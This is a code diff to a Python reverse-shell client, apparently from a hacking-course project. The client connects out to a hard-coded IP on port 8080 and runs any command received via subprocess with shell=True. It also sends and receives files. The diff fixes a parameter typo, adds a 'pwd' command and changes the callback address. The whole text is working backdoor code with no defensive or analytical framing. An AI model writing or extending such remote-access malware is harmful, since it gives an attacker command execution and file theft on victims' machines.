@@ -12,7 +12,7 @@ class MySocket:
     def command_execution(self, command):
         return subprocess.check_output(command, shell=True)
     
-    def json_send(setf, data):
+    def json_send(self, data):
         json_data = simplejson.dumps(data)
         self.my_connection.send(json_data.encode("utf-8"))
         
@@ -51,6 +51,8 @@ class MySocket:
                     command_optput = self.get_file_content(command[1])
                 elif command[0] == "upload":
                     command_optput = self.save_file(command[1], command[2])
+                elif command[0] == "pwd":
+                    command_optput = os.getcwd()
                 else:
                     command_optput = self.command_execution(command)
             except Exception:
@@ -59,5 +61,5 @@ class MySocket:
             
         self.my_connection.close()
         
-my_socket_object = MySocket("10.0.2.15", 8080)
+my_socket_object = MySocket("192.168.122.80", 8080)
 my_socket_object.start_socket()
